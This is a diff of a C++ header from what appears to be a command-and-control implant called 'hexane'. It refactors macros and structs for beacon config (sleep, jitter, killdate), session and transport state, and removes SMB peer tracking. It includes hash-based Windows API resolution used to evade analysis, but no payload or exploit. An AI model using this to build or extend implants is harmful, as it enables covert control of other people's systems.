@@ -202,32 +202,17 @@ WEAK EXTERN_C uint32_t		__instance;
 
 
 #define ZeroFreePtr(x, n) 		x_memset(x, 0, n); x_free(x); x = nullptr
-
 #define x_malloc(size) 			Ctx->nt.RtlAllocateHeap(Ctx->heap, HEAP_ZERO_MEMORY, size)
 #define x_realloc(ptr, size) 	Ctx->nt.RtlReAllocateHeap(Ctx->heap, HEAP_ZERO_MEMORY, ptr, size)
 #define x_free(size) 			Ctx->nt.RtlFreeHeap(Ctx->heap, 0, size)
 
-#define F_PTR_HMOD(Fn, hmod, sym_hash) 	\
-	Fn = (decltype(Fn)) Memory::Modules::GetExportAddress(hmod, sym_hash)
+#define F_PTR_HMOD(Fn, hmod, sym_hash)			Fn = (decltype(Fn)) Memory::Modules::GetExportAddress(hmod, sym_hash)
+#define F_PTR_HASHES(Fn, mod_hash, sym_hash)	Fn = (decltype(Fn)) Memory::Modules::GetExportAddress(Memory::Modules::GetModuleAddress(Memory::Modules::GetModuleEntry(mod_hash)), sym_hash)
+#define M_PTR(mod_hash)							Memory::Modules::GetModuleAddress(Memory::Modules::GetModuleEntry(mod_hash))
+#define NT_ASSERT(Fn)							Fn; if (NtCurrentTeb()->LastErrorValue != ERROR_SUCCESS) return
 
-
-#define F_PTR_HASHES(Fn, mod_hash, sym_hash) \
-	Fn = (decltype(Fn)) Memory::Modules::GetExportAddress(Memory::Modules::GetModuleAddress(Memory::Modules::GetModuleEntry(mod_hash)), sym_hash)
-
-
-#define M_PTR(mod_hash) \
-	Memory::Modules::GetModuleAddress(Memory::Modules::GetModuleEntry(mod_hash))
-
-
-#define NT_ASSERT(Fn)	\
-	Fn; if (NtCurrentTeb()->LastErrorValue != ERROR_SUCCESS) return
-
-
-#define return_defer(x)	\
-	ntstatus = x; goto defer
-
-#define success_(x) \
-    success = x; goto defer
+#define return_defer(x)			ntstatus = x; goto defer
+#define success_(x)				success = x; goto defer
 
 enum MessageType {
 	TypeCheckin     = 0x7FFFFFFF,
@@ -316,15 +301,6 @@ struct _proxy {
 	LPWSTR	address;
 	LPWSTR	username;
 	LPWSTR	password;
-};
-
-struct _smb_context {
-	DWORD 			peer_id;
-	LPWSTR 			ingress_name;
-	HANDLE 			ingress_handle;
-	LPWSTR 			egress_name;
-	HANDLE 			egress_handle;
-	_smb_context 	*next;
 };
 
 struct _http_context {
@@ -430,7 +406,6 @@ struct _hexane{
 	} base;
 
 	_executable *coffs;
-	_smb_context *peers;
 
 	struct {
 		// todo : finish tokens
@@ -451,36 +426,37 @@ struct _hexane{
 
 	struct {
 		PBYTE	key;
+		ULONG64	killdate;
 		LPSTR	hostname;
 		ULONG	sleeptime;
 		ULONG	jitter;
 		ULONG 	hours;
-		ULONG64	killdate;
 	} config;
 
 	struct {
-		INT		retry;
-		BOOL	checkin;
 		ULONG	ppid;
 		ULONG	pid;
 		ULONG	tid;
-		WORD	arch;
 		ULONG	version;
 		ULONG	current_taskid;
         ULONG	peer_id;
+		WORD	arch;
+		INT		retry;
+		BOOL	checkin;
 	} session;
 
 	struct {
+		_http_context 	*http;
+        _stream        	*outbound_queue;
+		HANDLE			pipe_handle;
+		LPWSTR			pipe_name;
+		LPSTR 			domain;
+		LPVOID	    	env_proxy;
+		SIZE_T	    	env_proxylen;
 		BOOL  	    	b_ssl;
 		BOOL	    	b_proxy;
 		BOOL	    	b_envproxy;
 		BOOL	    	b_envproxy_check;
-		LPVOID	    	env_proxy;
-		SIZE_T	    	env_proxylen;
-		LPSTR 			domain;
-		_http_context 	*http;
-		_smb_context	*smb;
-        _stream        	*outbound_queue;
 	} transport;
 
 	struct {
